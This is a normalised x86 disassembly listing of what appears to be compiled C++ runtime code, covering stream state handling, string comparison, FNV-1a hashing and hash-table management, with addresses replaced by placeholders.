mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
sub ecx ebx
dec ecx
add edi ecx
lea ecx [ ebx + 0x1 ]
jmp r-xdata
cmp ecx 0xfffffffd
je r-xdata
mov [ ebp + 0xc ] ecx
test edi edi
je r-xdata
mov al [ edx + 0x1 ]
cmp al [ esi + 0x1 ]
jne r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov al [ edx + 0x2 ]
cmp al [ esi + 0x2 ]
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov al [ edx + 0x3 ]
cmp al [ esi + 0x3 ]
je r-xdata
sub_40c9f0
push ebp
mov ebp esp
push 0xffffffff
push sub_430898
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
call sub_408ef0
mov eax [ ebp + 0x8 ]
mov [ esi + 0x38 ] eax
lea eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov [ esi + 0x3c ] 0x0
call sub_408ed0
push eax
mov [ ebp - 0x4 ] 0x0
call sub_40e080
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp + 0x8 ]
add esp 0x4
mov edi eax
test ecx ecx
je r-xdata
mov eax [ edi ]
push 0x20
mov eax [ eax + 0x20 ]
mov ecx edi
call eax
cmp [ esi + 0x38 ] 0x0
mov [ esi + 0x40 ] al
jne r-xdata
mov edx [ ecx ]
call [ edx + 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi + 0xc ]
or eax 0x4
and eax 0x17
mov [ esi + 0xc ] eax
test [ esi + 0x10 ] eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
push 0x0
mov ecx esi
call sub_408e40
sub_40cab0
push ebp
mov ebp esp
push 0xffffffff
push sub_4307f0
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov eax [ ecx + 0xc ]
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x3c ]
test ecx ecx
je r-xdata
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
cmp [ ecx + 0xc ] 0x0
jne r-xdata
call sub_40b3f0
mov edi edi
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x0
call sub_408e40
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40cb50
push ebp
mov ebp esp
push 0xffffffff
push sub_430870
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
mov [ ebp - 0x18 ] esi
mov eax [ eax + 0x4 ]
mov ebx 0x400
mov ecx [ eax + esi + 0x38 ]
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x2c ] esi
test ecx ecx
je r-xdata
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_40cab0
mov [ ebp - 0x28 ] al
mov [ ebp - 0x4 ] 0x1
test al al
je r-xdata
mov eax [ ecx ]
call [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov [ eax ] 0x0
mov eax [ esi + 0x8 ]
or eax [ esi + 0xc ]
jne r-xdata
movzx eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x20 ] eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
mov eax [ ecx + 0x1c ]
mov edx [ eax ]
test edx edx
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
test edi edi
je r-xdata
or edi 0x2
mov eax [ ecx ]
call [ eax + 0x18 ]
mov eax [ ecx + 0x2c ]
cmp [ eax ] 0x0
jle r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + eax + 0x38 ]
test ecx ecx
je r-xdata
or edi [ ecx + 0xc ]
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
cmp eax [ ebp - 0x20 ]
jne r-xdata
or edi 0x1
jmp r-xdata
movzx eax [ edx ]
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov edx [ ecx ]
call [ edx + 0x8 ]
and edi 0x17
mov [ ecx + 0xc ] edi
test [ ecx + 0x10 ] edi
je r-xdata
or edi 0x4
mov ecx [ ebp - 0x1c ]
add ebx 0xffffffff
adc ecx 0xffffffff
mov [ ebp - 0x1c ] ecx
test ecx ecx
jg r-xdata
add [ esi + 0x8 ] 0x1
mov eax [ esi ]
adc [ esi + 0xc ] 0x0
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
mov eax [ ecx + 0x1c ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x1
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_408e40
add [ esi + 0x8 ] 0x1
mov ecx [ ebp - 0x14 ]
adc [ esi + 0xc ] 0x0
mov [ ecx ] al
mov eax [ esi ]
inc ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + esi + 0x38 ]
call sub_40b520
jmp r-xdata
jl r-xdata
mov eax [ ecx ]
call [ eax + 0x1c ]
jmp r-xdata
mov edx [ ecx + 0x2c ]
mov eax [ edx ]
test eax eax
jle r-xdata
or edi 0x2
jmp r-xdata
test ebx ebx
jne r-xdata
dec eax
mov [ edx ] eax
mov eax [ ecx + 0x1c ]
inc [ eax ]
jmp r-xdata
sub_40cc89
mov ecx [ ebp - 0x18 ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
mov eax [ edx + ecx + 0xc ]
add edx ecx
or eax 0x4
cmp [ edx + 0x38 ] 0x0
jne r-xdata
and eax 0x17
mov [ edx + 0xc ] eax
test [ edx + 0x10 ] eax
je r-xdata
or eax 0x4
mov eax r-xdata
retn
push 0x1
mov ecx edx
call sub_408e40
sub_40cd80
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp [ esi + 0x14 ] 0x8
mov edi ecx
jae r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x10 ]
inc eax
je r-xdata
mov [ esi ] 0x0
mov eax [ esi ]
mov [ edi ] eax
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
xor eax eax
pop edi
mov [ esi ] ax
pop esi
pop ebp
retn 0x4
add eax eax
push eax
push esi
push edi
call sub_4170d0
add esp 0xc
jmp r-xdata
sub_40cde0
push ebp
mov ebp esp
push 0xffffffff
push sub_430323
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
push 0x0
mov [ ebp - 0x14 ] rw-data
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
call sub_40e000
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
push 0x10
push 0x0
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov [ rw-data ] 0x3f800000
mov [ rw-data ] 0x0
call sub_40ddf0
mov [ rw-data ] 0x7
mov [ rw-data ] 0x8
mov eax rw-data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_40ceb0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
cmp [ ebx + 0x14 ] 0x10
push edi
mov edi [ ebx + 0x10 ]
mov [ ebp - 0xc ] edi
jb r-xdata
mov esi ebx
mov esi [ ebx ]
jmp r-xdata
mov esi [ rw-data ]
mov ecx esi
and ecx edx
cmp [ rw-data ] ecx
ja r-xdata
movzx eax [ esi + ecx ]
xor edx eax
inc ecx
imul edx edx 0x1000193
cmp ecx edi
jb r-xdata
xor ecx ecx
mov edx 0x811c9dc5
test edi edi
je r-xdata
mov eax [ rw-data ]
lea esi [ eax + ecx * 8 ]
mov [ ebp - 0x8 ] esi
mov eax [ esi ]
mov [ ebp - 0x14 ] eax
mov ecx eax
shr esi 0x1
or eax 0xffffffff
sub eax esi
add ecx eax
mov eax [ esi + 0x4 ]
mov eax [ eax ]
mov eax edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov [ eax ] edx
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn 0x8
cmp [ ebx + 0x14 ] 0x10
lea edx [ ecx + 0x8 ]
jb r-xdata
cmp ecx eax
je r-xdata
mov edi ebx
mov edi [ ebx ]
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp - 0x10 ] eax
mov esi eax
cmovb esi [ ebp - 0x10 ]
test esi esi
je r-xdata
mov edx [ edx ]
cmp [ edx + 0x14 ] 0x10
mov eax [ edx + 0x10 ]
mov [ ebp - 0x10 ] eax
jb r-xdata
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
cmp edx edi
jb r-xdata
sub esi 0x4
jb r-xdata
mov ecx [ ecx ]
mov eax [ ebp - 0x14 ]
mov esi [ ebp - 0x8 ]
jmp r-xdata
xor eax eax
cmp edx edi
setne al
test eax eax
je r-xdata
cmp esi 0xfffffffc
je r-xdata
mov edi edi
mov edx [ rw-data ]
cmp eax edx
jne r-xdata
cmp [ ecx + 0x1c ] 0x10
mov edi [ ecx + 0x18 ]
lea edx [ ecx + 0x8 ]
jb r-xdata
xor eax eax
mov al [ edx ]
cmp al [ edi ]
jne r-xdata
add edx 0x4
add edi 0x4
sub esi 0x4
jae r-xdata
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
mov edx [ edx ]
sbb eax eax
or eax 0x1
jmp r-xdata
cmp esi 0xfffffffd
je r-xdata
mov eax [ edx ]
cmp eax [ edi ]
jne r-xdata
mov eax [ ebp - 0xc ]
cmp eax edi
mov esi edi
cmovb esi eax
test esi esi
je r-xdata
mov ebx [ ebx ]
test eax eax
jne r-xdata
mov al [ edx + 0x1 ]
cmp al [ edi + 0x1 ]
jne r-xdata
cmp eax edi
jb r-xdata
sub esi 0x4
jb r-xdata
cmp esi 0xfffffffe
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x8 ]
pop edi
mov ecx [ ecx ]
pop esi
mov [ eax ] ecx
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x8
xor eax eax
cmp [ ebp - 0xc ] edi
setne al
test eax eax
jne r-xdata
cmp esi 0xfffffffc
je r-xdata
jmp r-xdata
mov al [ edx + 0x2 ]
cmp al [ edi + 0x2 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
pop edi
mov ecx [ ecx ]
pop esi
mov [ eax ] ecx
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x8
xor eax eax
mov al [ ebx ]
cmp al [ edx ]
jne r-xdata
mov eax [ ebx ]
cmp eax [ edx ]
jne r-xdata
cmp esi 0xffffffff
je r-xdata
mov eax [ ebp - 0xc ]
sbb eax eax
or eax 0x1
jmp r-xdata
cmp esi 0xfffffffd
je r-xdata
add ebx 0x4
add edx 0x4
sub esi 0x4
jae r-xdata
mov al [ edx + 0x3 ]
cmp al [ edi + 0x3 ]
je r-xdata
test eax eax
jne r-xdata
mov al [ ebx + 0x1 ]
cmp al [ edx + 0x1 ]
jne r-xdata
cmp esi 0xfffffffe
je r-xdata
mov al [ ebx + 0x2 ]
cmp al [ edx + 0x2 ]
jne r-xdata
cmp esi 0xffffffff
je r-xdata
mov al [ ebx + 0x3 ]
cmp al [ edx + 0x3 ]
je r-xdata
sub_40d0f0
push ebx
mov ebx ecx
push esi
mov eax [ ebx ]
mov esi [ eax ]
mov [ eax ] eax
mov eax [ ebx ]
mov [ eax + 0x4 ] eax
mov [ ebx + 0x4 ] 0x0
cmp esi [ ebx ]
je r-xdata
pop esi
pop ebx
retn
push edi
jmp r-xdata
cmp [ esi + 0x1c ] 0x10
mov edi [ esi ]
jb r-xdata
mov [ esi + 0x1c ] 0xf
mov [ esi + 0x18 ] 0x0
push esi
mov [ esi + 0x8 ] 0x0
call j_sub_417912#2
add esp 0x4
mov esi edi
cmp edi [ ebx ]
jne r-xdata
push [ esi + 0x8 ]
call j_sub_417912#2
add esp 0x4
pop edi
sub_40d150
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
retn
push eax
call j_sub_417912#2
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
sub_40d180
push ebp
mov ebp esp
push 0xffffffff
push sub_430901
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi + 0x10 ]
inc eax
cmp [ esi + 0x8 ] eax
ja r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ esi + 0x10 ]
dec ecx
and [ esi + 0xc ] ecx
add eax [ esi + 0xc ]
and ecx eax
mov eax [ esi + 0x4 ]
lea edi [ ecx * 4 ]
cmp [ edi + eax ] 0x0
jne r-xdata
push ecx
call sub_40db70
mov eax [ esi + 0x4 ]
mov ecx [ edi + eax ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
push 0x18
call sub_41775f
mov ecx eax
add esp 0x4
test ecx ecx
jne r-xdata
inc [ esi + 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0xffffffff
push 0x0
push [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] 0x0
call sub_401500
mov eax [ esi + 0x4 ]
mov [ edi + eax ] ecx
call sub_4167fc
sub_40d240
push esi
mov esi ecx
push edi
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
mov eax [ esi + 0xc ]
dec eax
add eax ecx
mov ecx [ esi + 0x8 ]
dec ecx
and ecx eax
mov eax [ esi + 0x4 ]
mov edi [ eax + ecx * 4 ]
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
dec edi
mov eax [ eax + edi * 4 ]
test eax eax
je r-xdata
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
dec [ esi + 0x10 ]
mov ecx [ esi + 0x10 ]
jne r-xdata
push [ edi ]
call j_sub_417912#2
add esp 0x4
pop edi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push eax
call j_sub_417912#2
add esp 0x4
test edi edi
jne r-xdata
push eax
call j_sub_417912#2
add esp 0x4
test ecx ecx
jne r-xdata
mov [ esi + 0xc ] 0x0
sub_40d2e0
push ebp
mov ebp esp
push 0xffffffff
push sub_4308c8
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ esi + 0x50 ] 0x0
jne r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416ff9
add esp 0xc
test eax eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_40d450
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
call sub_40dab0
push eax
mov [ ebp - 0x4 ] 0x0
call sub_40e930
add esp 0x4
mov ecx esi
push eax
call sub_40d670
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
mov eax [ ecx ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_40d3a0
push esi
mov esi ecx
push edi
cmp [ esi + 0x50 ] 0x0
jne r-xdata
call sub_40d4f0
push [ esi + 0x50 ]
xor ecx ecx
test al al
mov edi esi
cmove edi ecx
call sub_4184ba
xor ecx ecx
add esp 0x4
test eax eax
cmovne edi ecx
xor edi edi
jmp r-xdata
lea eax [ esi + 0x4 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x14 ]
mov [ esi + 0x1c ] eax
lea eax [ esi + 0x18 ]
mov [ esi + 0x20 ] eax
lea eax [ esi + 0x24 ]
mov [ esi + 0x2c ] eax
mov [ esi + 0x4c ] 0x0
mov [ esi + 0x45 ] 0x0
lea ecx [ esi + 0x8 ]
mov [ esi + 0x10 ] ecx
lea eax [ esi + 0x28 ]
mov [ esi + 0x30 ] eax
mov [ ecx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov eax [ esi + 0x30 ]
mov [ eax ] 0x0
mov ecx [ esi + 0xc ]
mov eax edi
mov [ ecx ] 0x0
mov ecx [ esi + 0x1c ]
pop edi
mov [ ecx ] 0x0
mov ecx [ esi + 0x2c ]
mov [ ecx ] 0x0
mov ecx [ rw-data ]
mov [ esi + 0x50 ] 0x0
mov [ esi + 0x48 ] ecx
mov [ esi + 0x40 ] 0x0
pop esi
retn
sub_40d450
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
mov [ ecx + 0x45 ] 0x0
sete al
mov [ ecx + 0x4c ] al
lea eax [ ecx + 0x4 ]
mov [ ecx + 0xc ] eax
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x1c ] eax
lea eax [ ecx + 0x18 ]
mov [ ecx + 0x20 ] eax
lea eax [ ecx + 0x24 ]
mov [ ecx + 0x2c ] eax
lea edx [ ecx + 0x8 ]
mov [ ecx + 0x10 ] edx
lea eax [ ecx + 0x28 ]
mov [ ecx + 0x30 ] eax
mov [ edx ] 0x0
mov eax [ ecx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ eax ] 0x0
mov eax [ ecx + 0x30 ]
mov [ eax ] 0x0
mov eax [ ecx + 0xc ]
mov [ eax ] 0x0
mov eax [ ecx + 0x1c ]
mov [ eax ] 0x0
mov eax [ ecx + 0x2c ]
mov [ eax ] 0x0
test edx edx
je r-xdata
mov eax [ rw-data ]
mov [ ecx + 0x50 ] edx
mov [ ecx + 0x48 ] eax
mov [ ecx + 0x40 ] 0x0
pop ebp
retn 0x8
lea eax [ edx + 0x8 ]
mov [ ecx + 0xc ] eax
mov [ ecx + 0x10 ] eax
lea eax [ edx + 0x4 ]
mov [ ecx + 0x1c ] edx
mov [ ecx + 0x20 ] edx
mov [ ecx + 0x2c ] eax
mov [ ecx + 0x30 ] eax
sub_40d4f0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_430768
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x38 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
cmp [ ebx + 0x40 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebx + 0x45 ] 0x0
je r-xdata
mov eax [ ebx ]
push 0xffffffff
call [ eax + 0xc ]
cmp eax 0xffffffff
jne r-xdata
mov ecx 0xf
mov [ esp + 0x18 ] 0x0
xorps xmm0 xmm0
movq [ esp + 0x18 ] xmm0
lea eax [ esp + 0x18 ]
cmp ecx 0x10
cmovae eax [ esp + 0x18 ]
mov [ esp + 0x2c ] ecx
mov [ esp + 0x28 ] 0x8
mov [ eax + 0x8 ] 0x0
mov [ esp + 0x40 ] 0x0
jmp r-xdata
xor al al
jmp r-xdata
cmp [ esp + 0x2c ] 0x10
mov ecx [ ebx + 0x40 ]
lea eax [ esp + 0x14 ]
mov edx [ ecx ]
push eax
mov eax [ esp + 0x2c ]
lea edi [ esp + 0x1c ]
cmovae edi [ esp + 0x1c ]
lea esi [ esp + 0x1c ]
cmovae esi [ esp + 0x1c ]
add eax edi
push eax
push esi
lea eax [ ebx + 0x48 ]
push eax
call [ edx + 0x20 ]
sub eax 0x0
je r-xdata
mov ecx [ esp + 0x38 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov [ ebx + 0x45 ] 0x0
dec eax
je r-xdata
cmp [ ebx + 0x45 ] 0x0
je r-xdata
push [ ebx + 0x50 ]
cmp ecx 0x10
push esi
lea eax [ esp + 0x20 ]
cmovae eax edx
push 0x1
push eax
call sub_417f55
add esp 0x10
cmp esi eax
jne r-xdata
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x18 ]
mov esi [ esp + 0x14 ]
cmp ecx 0x10
lea eax [ esp + 0x18 ]
cmovae eax edx
sub esi eax
je r-xdata
sub eax 0x2
je r-xdata
mov bl 0x1
test esi esi
jne r-xdata
xor bl bl
jmp r-xdata
mov al bl
jmp r-xdata
push [ esp + 0x18 ]
call j_sub_417912#2
add esp 0x4
push esi
push 0x8
lea ecx [ esp + 0x20 ]
call sub_40c840
jmp r-xdata
cmp [ esp + 0x2c ] 0x10
jb r-xdata
sub_40d670
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov eax [ edi ]
mov ecx edi
mov eax [ eax + 0xc ]
call eax
test al al
je r-xdata
lea eax [ esi + 0x4 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x14 ]
mov [ esi + 0x1c ] eax
lea eax [ esi + 0x18 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x40 ] edi
lea eax [ esi + 0x24 ]
mov [ esi + 0x2c ] eax
lea ecx [ esi + 0x8 ]
mov [ esi + 0x10 ] ecx
lea eax [ esi + 0x28 ]
mov [ esi + 0x30 ] eax
mov [ ecx ] 0x0
mov eax [ esi + 0x20 ]
pop edi
mov [ eax ] 0x0
mov eax [ esi + 0x30 ]
mov [ eax ] 0x0
mov eax [ esi + 0xc ]
mov [ eax ] 0x0
mov eax [ esi + 0x1c ]
mov [ eax ] 0x0
mov eax [ esi + 0x2c ]
pop esi
mov [ eax ] 0x0
pop ebp
retn 0x4
pop edi
mov [ esi + 0x40 ] 0x0
pop esi
pop ebp
retn 0x4
sub_40d700
push esi
mov esi [ ecx + 0xc ]
lea eax [ ecx + 0x44 ]
cmp [ esi ] eax
jne r-xdata
pop esi
retn
mov eax [ ecx + 0x38 ]
mov edx [ ecx + 0x3c ]
mov [ esi ] eax
mov eax [ ecx + 0x1c ]
mov [ eax ] edx
mov eax [ ecx + 0x2c ]
sub edx edx
mov [ eax ] edx
sub_40d730
push esi
mov edx ecx
push edi
mov edi [ edx + 0xc ]
lea esi [ edx + 0x44 ]
mov eax [ edi ]
cmp eax esi
je r-xdata
mov [ edi ] esi
mov eax [ edx + 0x1c ]
mov ecx edx
mov [ eax ] esi
mov eax [ edx + 0x2c ]
sub ecx esi
add ecx 0x45
pop edi
mov [ eax ] ecx
pop esi
retn
mov ecx [ edx + 0x1c ]
mov [ edx + 0x38 ] eax
mov eax [ edx + 0x2c ]
mov eax [ eax ]
add eax [ ecx ]
mov [ edx + 0x3c ] eax
sub_40d770
push esi
mov esi ecx
call j_sub_41c24d
test al al
jne r-xdata
mov ecx [ esi ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + ecx + 0x38 ]
test ecx ecx
je r-xdata
mov ecx [ esi ]
call sub_40d980
pop esi
retn
mov eax [ ecx ]
pop esi
jmp [ eax + 0x8 ]
sub_40d810
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
je r-xdata
mov edx [ esi + 0x10 ]
mov ecx [ ebp + 0xc ]
or eax 0xffffffff
sub eax edx
cmp eax ecx
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
push r--data
call sub_41682d
test ecx ecx
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ edx + ecx ]
cmp edi 0xfffffffe
ja r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
push r--data
call sub_41682d
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push edx
push edi
mov ecx esi
call sub_4018d0
mov ecx [ ebp + 0xc ]
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
mov eax [ esi + 0x10 ]
add eax edx
cmp eax ebx
jbe r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
push [ ebp + 0xc ]
mov eax esi
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_40dce0
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
push [ ebp + 0xc ]
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_40dce0
pop esi
pop ebx
pop ebp
retn 0x8
mov edx esi
mov edx [ esi ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax [ esi + 0x10 ]
push ecx
add eax edx
push ebx
push eax
call sub_41a1a0
add esp 0xc
test ecx ecx
je r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub_40d940
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
cmp eax 0x1
jne r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
push eax
movsx eax [ ebp + 0x10 ]
push eax
lea eax [ ecx + edx ]
push eax
call sub_41cae0
add esp 0xc
pop ebp
retn 0xc
mov ecx [ ecx ]
mov al [ ebp + 0x10 ]
mov [ ecx + edx ] al
pop ebp
retn 0xc
mov ecx [ ecx ]
sub_40d980
push ebp
mov ebp esp
push 0xffffffff
push sub_430810
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
cmp [ eax + esi + 0xc ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test [ eax + esi + 0x14 ] 0x2
je r-xdata
mov ecx [ eax + esi + 0x38 ]
mov eax [ ecx ]
call [ eax + 0x34 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
push 0x0
call sub_408e40
sub_40da20
push esi
mov esi ecx
